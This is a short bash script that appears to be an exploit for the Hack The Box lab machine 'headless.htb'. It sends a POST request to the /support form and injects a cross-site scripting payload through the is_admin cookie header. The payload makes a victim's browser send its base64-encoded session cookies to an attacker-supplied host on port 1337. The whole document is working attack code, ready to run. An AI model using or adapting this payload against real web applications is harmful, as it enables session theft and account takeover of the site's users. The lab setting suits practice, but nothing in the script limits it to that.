#!/bin/bash

rhost=${1}
xss="<script>var i=new Image(); i.src='http://${rhost}:1337?cookie='+btoa(document.cookie);</script>"

curl -X POST http://headless.htb:5000/support \
  -d "message=<script>" \
  -H "Cookie: is_admin=${xss}"
